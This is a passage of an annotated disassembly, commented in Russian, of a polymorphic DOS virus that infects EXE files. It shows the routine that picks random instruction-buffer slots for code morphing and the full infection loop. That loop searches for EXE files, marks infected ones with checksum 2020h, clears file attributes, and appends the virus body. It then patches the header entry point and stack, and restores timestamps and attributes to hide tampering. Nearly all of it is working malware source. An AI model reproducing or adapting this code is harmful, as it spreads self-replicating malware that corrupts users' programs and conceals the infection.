   │   _0343:                                                 ║ ║
   │       MOV    AX,0003                                     ║ ║
   │   _0346:                                                 ║ ║
   │       ADD    SI,AX                                       ║ ║
   │   _0348:                                                 ║ ║
   │   _0349:                                                 ║ ║
   │   *   DEC    CX     ; уменьшает счетчик                  ║ ║
   │   _034A:                                                 ║ ║
   │   _034B:                                                 ║ ║
   │   _034C:                                                 ║ ║
   │       JZ     _0352  ; морфование завершено───────────────╫─╫┐
   │   _034E:                                                 ║ ║│
   │   _034F:                                                 ║ ║│
   └───    JMP    _0121  ; продолжить морфование              ║ ║│
                                   <──────────────────────────╫─╫┘
       _0352:                                                 ║ ╚══╗
           JMP    _0397            ───────────────────────────╫─┐  ║
       _0354:                                                 ║ │  ║
                                                              ║ │  ║
; Процедура расчета случайного положения команды в INSTRUCTION_BUFFER
; Вход: неопределенность                                      ║ │  ║
;                                                             ║ │  ║
; Выход: DI = адрес случайной ячейки в буфере                 ║ │  ║
  ┌───>                                                       ║ │  ║
  │    _0355:                      <══════════════════════════╝ │  ║
  │                                <═════════════╗              │  ║
  │        IN     AL,[40h]                       ║              │  ║
  │    _0357:                                    ║              │  ║
  │    _0358:                                    ║              │  ║
  │        MOV    AH,AL                          ╚══════════════╪══╝
  │    _035A:                                                   │
  │    _035B:                                                   │
  │        IN     AL,[40h]                                      │
  │    _035D:                                                   │
  │    _035E:                                                   │ ; Начиная отсюда, можно короче, при том учитывая требования к морфизму:
  │        MOV    DI,AX    ; В DI - случайное число             │ ;    MOV DI,016Eh
  │    _0360:                                                   │ ; loop_again:
  │    _0361:                                                   │ ;    SUB AX,DI
  │        MOV    AX,016Eh                                      │ ;    CMP DI,AX
  │┌──>                                                         │ ;    JCE loop_again
  ││   _0364:                                                   │ ;    SHL AX,1
  ││       SUB    DI,AX    ; Приводим DI к интервалу [0..16D]   │ ;    MOV DI,AX
  ││   _0366:                                                   │ ;    SHL AX,1
  ││   _0367:                                                   │ ;    ADD DI,AX
  ││   *   CMP    DI,AX                                         │
  ││   _0369:                                                   │
  ││   _036A:                                                   │
  │└───    JNC    _0364                                         │
  │    _036C:              ; Теперь DI - номер ячейки буфера    │
  │    _036D:                                                   │
  │        MOV    AX,DI    ; Умножает DI на 6 => DI - смещение  │
  │    _036F:              ; выбранной ячейки в буфере          │
  │    _0370:              ; 6 - размер ячеек                   │
  │        ADD    DI,AX                                         │
  │    _0372:                                                   │
  │    _0373:                                                   │
  │        ADD    DI,AX                                         │
  │    _0375:                                                   │
  │    _0376:                                                   │
  │        ADD    DI,AX                                         │
  │    _0378:                                                   │
  │    _0379:                                                   │
  │        ADD    DI,AX                                         │
  │    _037B:                                                   │
  │    _037C:                                                   │
  │        ADD    DI,AX                                         │
  │    _037E:                                                   │
  │    _037F:                                                   │
  │        MOV    AX,058Ch                                      │
  │    _0382:                                                   │
  │        ADD    DI,AX    ; Теперь DI - полный адрес           │
  │    _0384:              ; выбранной                          │
  │    _0385:              ; в INSTRUCTION_BUFFER               │
  │        ADD    DI,BP    ; ячейки                             │
  │    _0387:                                                   │
  │    _0388:                                                   │
  │        MOV    AL,90h                                        │
  │    _038A:                                                   │
  │    _038B:                                                   │
  │        MOV    AH,AL                                         │
  │    _038D:                                                   │
  │    _038E:                                                   │
  │    *   CMP    [DI],AX  ; Если там не NOP NOP- значит, занято│
  │    _0390:                                                   │
  │    _0391:                                                   │
  └────    JNZ    _0355                                         │
       _0393:                                                   │
       _0394:                                                   │
           RET             ; ячейка свободна, вернуть адрес в DI│
       _0395:                                                   │
       _0396:                                                   │
                                   <────────────────────────────┘
       _0397:              ; Сюда попадаем, когда кончились *.EXE
           MOV    SI,056Eh ; Теперь восстановим...
       _039A:
           ADD    SI,BP
       _039C:
       _039D:
           MOV    DI,0556h
       _03A0:
           ADD    DI,BP
       _03A2:
       _03A3:
           MOV    AX,[SI+14h] ; ...IP,
       _03A6:
           STOSW
       _03A7:
       _03A8:
       _03A9:
           MOV    AX,[SI+16h] ; CS,
       _03AC:
           STOSW
       _03AD:
       _03AE:
       _03AF:
           MOV    AX,[SI+0Eh] ; SS,
       _03B2:
           STOSW
       _03B3:
       _03B4:
       _03B5:
           MOV    AX,[SI+10h] ; SP зараженной проги
       _03B8:
           STOSW
       _03B9:
       _03BA:
       _03BB:
           MOV    AH,1Ah      ; Set DTA
       _03BD:                 ; он DTA не восстанавливает :-(
       _03BE:
           MOV    DX,0E20h
       _03C1:
           ADD    DX,BP
       _03C3:
       _03C4:
           MOV    DI,DX
       _03C6:
       _03C7:
           INT    21h
       _03C9:
       _03CA:
           MOV    AH,4Eh      ; Find 1st
       _03CC:
       _03CD:
           MOV    CX,0007
       _03D0:
           MOV    DX,055Fh    ; DS:DX=>????????.EXE
       _03D3:
       *   ADD    DX,BP
       _03D5:
 ┌─┬──>
 │ │   _03D6:
 │ │       INT    21h         ; DOS Call
 │ │   _03D8:
 │ │   _03D9:
 │ │       JNC    _03DF            ──────────────────────────────┐
 │ │   _03DB:                                                    │
 │ │   _03DC:                                                    │
 │ │       JMP    _052F       ; ─ Была ошибка, напр. больше нет ф│
 │ │                               <────────────────────────────а┘
 │ │   _03DF:                                                   й
 │ │       MOV    AX,3D00h    ; Открыть для чтения              л
 │ │   _03E2:                                                   о
 │ │       MOV    DX,0E3Eh    ; только-что найденный файл       в
 │ │   _03E5:                                                   │
 │ │       ADD    DX,BP                                         │
 │ │   _03E7:                                                   │
 │ │   _03E8:                                                   │
 │ │       INT    21h                                           │
 │ │   _03EA:                                                   │
 │ │   _03EB:                                                   │
 │ │       XCHG   AX,BX       ; в BX - Handle ( или код ошибки;)│
 │ │   _03EC:                 ; вобще-то, ошибок не должно быть │
 │ │   _03ED:                                                   │
 │ │   _03EE:                                                   │
 │ │       MOV    AH,3Fh      ; Читает из файла                 │
 │ │   _03F0:                                                   │
 │ │   _03F1:                                                   │
 │ │       MOV    DX,SI       ; в HEADER                        │
 │ │   _03F3:                                                   │
 │ │   _03F4:                                                   │
 │ │       MOV    CX,001Ah    ; часть MZ-headera                │
 │ │   _03F7:                                                   │
 │ │       INT    21h                                           │
 │ │   _03F9:                                                   │
 │ │   _03FA:                                                   │
 │ │       MOV    AH,3Eh      ; Клозяет филе                    │
 │ │   _03FC:                                                   │
 │ │   _03FD:                                                   │
 │ │       INT    21h                                           │
 │ │   _03FF:                                                   │
 │ │   _0400:                                                   │
 │ │       MOV    AX,5A4Dh    ; Проверяет, это EXE              │
 │ │   _0403:                 ; или переименованый COM          │
 │ │   *   CMP    [SI],AX                                       │
 │ │   _0405:                                                   │
 │ │   _0406:                                                   │
 │ │       JZ     _0418            ────────────────────────────┐│
 │ │   _0408:                                                  ││
 │ │   _0409:                                                  ││
 │ │       XCHG   AH,AL       ; бывает два варианта подписи EXE││
 │ │   _040B:                 ; MZ и ZM                        ││
 │ │   _040C:                                                  ││
 │ │   *   CMP    [SI],AX                                      ││
 │ │   _040E:                                                  ││
 │ │   _040F:                                                  ││
 │ │       JZ     _0418            ───────────────────────────┐││
 │ │   _0411:                 ; не EXE-файл, искать следующий │││
 │┌┼──>                                                       │││
 │││   _0412:                                                 │││
 │││       MOV    AH,4Fh      ; FindNext                      │││
 │││   _0414:                                                 │││
 │││   _0415:                                                 │││
 ││└───    JMP    _03D6       ; Goto INT 21h                  │││
 ││    _0417:                                                 │││
 ││                                <──────────────────────────┴┘│
 ││    _0418:                                                   │
 ││        MOV    AX,2020h                                      │
 ││    _041B:                                                   │
 ││    *   CMP    [SI+12h],AX ; Если Chksum=2020h, значит       │
 ││    _041E:                 ; филе заражено( ну, такая вот    │
 │└────    JZ     _0412       ; у него подпись ), искать другой │
 │     _0420:                                                   │
 │     _0421:                                                   │
 │         MOV    AX,4301h    ; устанавливает атрибут           │
 │     _0424:                                                   │
 │         XOR    CX,CX       ; точнее, снимает ReadOnly, System│
 │     _0426:                 ; и т.д.                          │
 │     _0427:                                                   │
 │         MOV    DX,0E3Eh    ; Снова имя только что найденного │
 │     _042A:                 ; филе                            │
 │         ADD    DX,BP                                         │
 │     _042C:                                                   │
 │     _042D:                                                   │
 │         INT    21h                                           │
 │     _042F:                                                   │
 │     _0430:                                                   │
 │         MOV    AX,3D02h    ; открывает для чтения и записи   │
 │     _0433:                                                   │
 │         MOV    DX,0E3Eh                                      │
 │     _0436:                                                   │
 │         ADD    DX,BP                                         │
 │     _0438:                                                   │
 │     _0439:                                                   │
 │         INT    21h                                           │
 │     _043B:                                                   │
 │     _043C:                                                   │
 │         XCHG   AX,BX       ; BX=Handle или код ошибки ;)     │
 │     _043D:                                                   │
 │     _043E:                                                   │
 │     _043F:                                                   │
 │         MOV    AX,4202h    ; позиционирует указатель         │
 │     _0442:                 ; в конец файла ( или кода ошибки;)
 │         XOR    CX,CX                                         │
 │     _0444:                                                   │
 │     _0445:                                                   │
 │         XOR    DX,DX                                         │
 │     _0447:                                                   │
 │     _0448:                                                   │
 │         INT    21h                                           │
 │     _044A:                                                   │
 │     _044B:                                                   │
 │         MOV    AH,40h      ; Про себя, про себя бы не забыть!│
 │     _044D:                                                   │
 │     _044E:                                                   │
 │         MOV    CX,0D20h    ; Приписывается в конец файла     │
 │     _0451:                                                   │
 │         MOV    DX,0100h                                      │
 │     _0454:                                                   │
 │         ADD    DX,BP                                         │
 │     _0456:                                                   │
 │     _0457:                                                   │
 │         INT    21h                                           │
 │     _0459:                 ; Дальше идет корректировка Headerа
 │     _045A:                                                   │
 │         MOV    AX,[SI+08]  ; Длина Headerа в параграфах      │
 │     _045D:                                                   │
 │         MOV    CL,04                                         │
 │     _045F:                                                   │
 │     _0460:                                                   │
 │         SHL    AX,CL       ; а теперь в байтах               │
 │     _0462:                                                   │
 │     _0463:                                                   │
 │         PUSH   BX                                            │
 │     _0464:                                                   │
 │     _0465:                                                   │
 │     _0466:                                                   │
 │         XCHG   AX,BX                                         │
 │     _0467:                                                   │
 │     _0468:                                                   │
 │     _0469:                                                   │
 │         MOV    AX,[DI+1Ah] ; из DTA берет длину филе         │
 │     _046C:                                                   │
 │         MOV    DX,[DI+1Ch]                                   │
 │     _046F:                                                   │
 │         PUSH   AX                                            │
 │     _0470:                                                   │
 │     _0471:                                                   │
 │     _0472:                                                   │
 │         PUSH   DX                                            │
 │     _0473:                                                   │
 │     _0474:                                                   │
 │     _0475:                                                   │
 │         SUB    AX,BX       ; Вычитает длину Хедера           │
 │     _0477:                                                   │
 │     _0478:                                                   │
 │         SBB    DX,0000                                       │
 │     _047B:                                                   │
 │         MOV    CX,0010h                                      │
 │     _047E:                                                   │
 │         DIV    CX                                            │
 │     _0480:                 ; Теперь AX - число параграфов    │
 │     _0481:                 ;  до точки входа (ReloCS)        │
 │         MOV    [SI+14h],DX ; а DX - ReloIP                   │
 │     _0484:                                                   │
 │         MOV    [SI+16h],AX ; запишем это в новый Хедер       │
 │     _0487:                                                   │
 │         MOV    BX,0101h                                      │
 │     _048A:                                                   │
 │         ADD    BX,BP                                         │
 │     _048C:                                                   │
 │     _048D:                                                   │
 │         MOV    [BX],DX     ; а также в себя, чтобы при       │
 │     _048F:                 ; запуске проги определить        │
 │     _0490:                 ; смещение начала сегмента данных │
 │         INC    AX          ; А это -                         │
 │     _0491:                 ; для SS                          │
 │     _0492:                                                   │
 │     _0493:                                                   │
 │         MOV    [SI+0Eh],AX ; Сохраним свой SS                │
 │     _0496:                                                   │
 │         MOV    AX,0E20h                                      │
 │     _0499:                                                   │
 │         ADD    DX,AX       ; вычисляет свой SP               │
 │     _049B:                                                   │
 │     _049C:                                                   │
 │         MOV    [SI+10h],DX ; записывает в новый Хедер        │
 │     _049F:                                                   │
 │         MOV    AX,2020h                                      │
 │     _04A2:                                                   │
 │         MOV    [SI+12h],AX ; записывает ChkSum=2020h - метка │
 │     _04A5:                 ; зараженности                    │
 │         POP    DX                                            │
 │     _04A6:                                                   │
 │     _04A7:                                                   │
 │     _04A8:                                                   │
 │         POP    AX          ; DX:AX - длина филе              │
 │     _04A9:                                                   │
 │     _04AA:                                                   │
 │     _04AB:                                                   │
 │         ADD    AX,0D20h    ; Добавим длину себя              │
 │     _04AE:                                                   │
 │         ADC    DX,0000                                       │
 │     _04B1:                                                   │
 │         MOV    CL,09       ; вычисляет число 512-байтных     │
 │     _04B3:                 ; страничек                       │
 │     _04B4:                                                   │
 │         PUSH   AX                                            │
 │     _04B5:                                                   │
 │     _04B6:                                                   │
 │     _04B7:                                                   │
 │         SHR    AX,CL                                         │
 │     _04B9:                                                   │
 │     _04BA:                                                   │
 │         ROR    DX,CL                                         │
 │     _04BC:                                                   │
 │     _04BD:                                                   │
 │         STC                ; CF=1                            │
 │     _04BE:                                                   │
 │     _04BF:                                                   │
 │     _04C0:                                                   │
 │         ADC    DX,AX       ; DX=AX+DX+CF - число 512-байтных │
 │     _04C2:                 ;  страниц, включая неполную      │
 │     _04C3:                                                   │
 │         POP    AX                                            │
 │     _04C4:                 ; вычисляет неполную страницу     │
 │     _04C5:                                                   │
 │     _04C6:                                                   │
 │         AND    AH,01                                         │
 │     _04C9:                 ; AX=длина неполной страницы      │
 │         MOV    [SI+04],DX  ; сохраняет новые данные          │
 │     _04CC:                 ; про страницы                    │
 │         MOV    [SI+02],AX                                    │
 │     _04CF:                                                   │
 │         POP    BX                                            │
 │     _04D0:                 ; BX=Handle                       │
 │     _04D1:                                                   │
 │     _04D2:                                                   │
 │         MOV    AX,4201h    ; Позиционирует точку записи      │
 │     _04D5:                                                   │
 │         MOV    CX,0FFFFh   ; на 0D1Fh байт назад             │
 │     _04D8:                                                   │
 │         MOV    DX,0F2E1h                                     │
 │     _04DB:                                                   │
 │         INT    21h                                           │
 │     _04DD:                                                   │
 │     _04DE:                                                   │
 │         MOV    AH,40h      ; записывает смещение сегмента    │
 │     _04E0:                 ; данных выря в этой проге        │
 │     _04E1:                                                   │
 │         MOV    CX,0002                                       │
 │     _04E4:                                                   │
 │         MOV    DX,0101h                                      │
 │     _04E7:                                                   │
 │         ADD    DX,BP                                         │
 │     _04E9:                                                   │
 │     _04EA:                                                   │
 │         INT    21h                                           │
 │     _04EC:                                                   │
 │     _04ED:                                                   │
 │         MOV    AX,4200h    ; Позиционирует точку записи в    │
 │     _04F0:                 ; начало филе                     │
 │         XOR    CX,CX                                         │
 │     _04F2:                                                   │
 │     _04F3:                                                   │
 │         XOR    DX,DX                                         │
 │     _04F5:                                                   │
 │     _04F6:                                                   │
 │         INT    21h                                           │
 │     _04F8:                                                   │
 │     _04F9:                                                   │
 │         MOV    AH,40h      ; Записывает новый Хедер          │
 │     _04FB:                                                   │
 │     _04FC:                                                   │
 │         MOV    CX,001Ah                                      │
 │     _04FF:                                                   │
 │         MOV    DX,SI                                         │
 │     _0501:                                                   │
 │     _0502:                                                   │
 │         INT    21h                                           │
 │     _0504:                                                   │
 │     _0505:                                                   │
 │         MOV    AX,5701h    ; Устанавливает TimeDateStamp     │
 │     _0508:                 ; в былое значение                │
 │         MOV    CX,[DI+16h] ; берет из DTA                    │
 │     _050B:                                                   │
 │         MOV    DX,[DI+18h]                                   │
 │     _050E:                                                   │
 │         INT    21h                                           │
 │     _0510:                                                   │
 │     _0511:                                                   │
 │         MOV    AH,3Eh      ; закрывает филе                  │
 │     _0513:                                                   │
 │     _0514:                                                   │
 │         INT    21h                                           │
 │     _0516:                                                   │
 │     _0517:                                                   │
 │         MOV    AX,4301h    ; Устанавливает старый атрибут    │
 │     _051A:                 ; филе                            │
 │         MOV    CH,00                                         │
 │     _051C:                                                   │
 │     _051D:                                                   │
 │         MOV    CL,[DI+15h] ; берет атрибут из DTA            │
 │     _0520:                                                   │
 │         MOV    DX,0E3Eh                                      │
 │     _0523:                                                   │
 │         ADD    DX,BP                                         │
 │     _0525:                                                   │
 │     _0526:                                                   │
 │         INT    21h                                           │
 │     _0528:                                                   │
 │     _0529:                                                   │
 │         MOV    AH,4Fh      ; FindNext, браткИ                │
 │     _052B:                                                   │
 │     _052C:                                                   │
 └─────    JMP    _03D6                                         │
                                   <────────────────────────────┘
       _052F:                 ; кончились EXE-шники в каталоге
           MOV    AH,62h      ; Get PSP
       _0531:
       _0532:
           INT    21h
       _0534:
       _0535:
           MOV    ES,BX       ; ES устанавливает на PSP
       _0537:
       _0538:
           MOV    AX,BX
       _053A:
       _053B:
           ADD    AX,0010h
       _053E:
           MOV    SI,0556h
       _0541:
           ADD    SI,BP
       _0543:
       _0544:
           ADD    [SI+02],AX  ; записывает реальный сегмент кода
       _0547:                 ; в Джумп фаре
           ADD    AX,[SI+04]
       _054A:                 ; теперь AX=SS для проги.
           CLI                ; Вобще-то,
       _054B:                 ; в руководстве по процеку
       _054C:                 ; написано, что если
       _054D:                 ; что-то заносится в SS, CLI устанавливается
           MOV    SP,[SI+06]  ; на одну команду автоматически - предполагается,
       _0550:                 ; что сразу за
           MOV    SS,AX       ; MOV SS,smth/MOV SS,[from smWhere]/POP SS etc.
       _0552:                 ; будет следовать команда
           STI                ; инициализации SP, хотя, почему-то
       _0553:                 ; никто не использует этого, и все
           MOV    DS,BX       ; чинят CLI ... а потом STI
       _0555:                 ; инициализирует DS
           DB     0EAH        ; Джумп фар Иммедиат_Сегмент:Иммедиат_Оффсет
           DW     ?, ?
_SS     DW      ?             ; ReloSS
_SP     DW      ?             ; ReloSP
DTA:
        DB      ?
        DB      '????????.EXE'
        DB      17h DUP (?)

HEADER:
        DW      0Ah DUP (?)
_IP     DW      ?
_CS     DW      ?              ; Здесь: 0FFF0h
        DW      3 DUP (?)
Instruction_Buffer:
; дальше идет 90h 90h 00 00 00 00, повторяющееся 016Eh раз, выравнивая длину выря
; до 0D20h - это буфер для команд
        DW      016Eh DUP( 9090h, 0000, 0000 )

                Instruction summary

MOV:                    153   10% ▄▄▄▄▄▄
Other data xfer:        4     0%  .
Add/Sub:                801   56% ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
Inc/Dec:                7     0%  .
Mul/Div:                1     0%  .
Logical:                12    0%  .
String:                 9     0%  .
REP:                    8     0%  .
CALL:                   2     0%  .
RET:                    1     0%  .
INT:                    17    1%  .
Jmp cond:               36    2%  ▄
JMP:                    11    0%  .
Bit Shift:              3     0%  .
Flags:                  5     0%  .
CMP:                    34    2%  ▄
BCD/type conv:          7     0%  .
POP:                    7     0%  .
PUSH:                   6     0%  .
Input/Output:           9     0%  .
Proc/Mac/Struc Direct:  1     0%  .
Data Declarations:      2     0%  .
Other Directives:       291   20% ▄▄▄▄▄▄▄▄▄▄▄▄
Calc/Move ratio = 4.60

             Summary Table
PROCEDURES:         1
MACROS:             0
CALLS:              2
MACRO CALLS:        0
EXTERNALS:          0
Source Lines:    1428
SYMBOLS:          664
Symbol Space:    3983
